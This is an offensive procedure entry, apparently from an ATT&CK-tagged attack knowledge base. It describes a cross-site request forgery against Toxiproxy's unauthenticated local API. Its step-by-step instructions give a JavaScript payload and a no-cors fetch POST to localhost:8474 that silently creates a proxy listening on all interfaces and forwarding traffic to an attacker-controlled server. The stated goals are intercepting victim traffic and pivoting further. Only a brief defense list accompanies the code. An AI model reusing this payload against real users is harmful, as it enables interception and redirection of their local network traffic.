---
tags:
  - csrf
  - proxy-creation
  - javascript
type: procedure
tools:
  - '[[tools/fetch-API]]'
  - '[[tools/toxiproxy]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[User Execution]]'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
id: a1f50f49-a5d3-4ca3-b888-c60ceac4a1c6
created_at: '2025-12-14T17:27:29.730Z'
updated_at: '2025-12-14T17:27:29.730Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[User Execution]]'
---
# CSRF-Creation-of-New-Proxy-via-Fetch-API

## Summary

This procedure uses JavaScript's fetch API from a malicious webpage to perform a cross-site request forgery (CSRF) attack on Toxiproxy's unauthenticated HTTP API, creating a new TCP proxy that listens on a specified port and forwards traffic to an attacker-controlled upstream server.

## Description

The attack tricks a victim into visiting a malicious site, which sends a POST request to http://localhost:8474/proxies without user awareness. No CSRF tokens are validated, allowing arbitrary proxy creation. This enables the attacker to intercept or redirect local traffic. Prerequisites include a running Toxiproxy instance and victim browser support for fetch.

## Requirements

1. Victim's Toxiproxy running on localhost:8474
2. Attacker-hosted malicious webpage with JavaScript
3. Victim browser allowing no-cors mode requests

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in API endpoints
- Configure browser security headers (e.g., Origin checks) on local APIs
- Monitor for anomalous POST requests to localhost ports via network logs

## Objectives

1. Create a TCP proxy without authentication
2. Route victim traffic to attacker server
3. Establish foundation for further pivoting

## Instructions

### Step 1: Prepare Malicious Payload

**Context**: Define the JSON payload for the new proxy configuration.

No command; use JavaScript object:

```javascript
const proxyConfig = {
  name: 'csrf',
  listen: '0.0.0.0:2773',
  upstream: { url: 'attacker-server:9999' },
  enabled: true
};
```

> Payload specifies proxy name, local listen port, upstream target, and enables it immediately.

### Step 2: Execute CSRF POST

**Context**: Send the request using fetch in no-cors mode to bypass preflight checks.

**Command** (JavaScript via [[tools/fetch-API]]):
```javascript
fetch('http://localhost:8474/proxies', {
  method: 'POST',
  mode: 'no-cors',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(proxyConfig)
});
```

> The request creates the proxy silently. Expected output is none due to no-cors (opaque response).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[User Execution]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/fetch-API]]
- [[tools/toxiproxy]]

## Tags

- csrf
- proxy-creation
- javascript
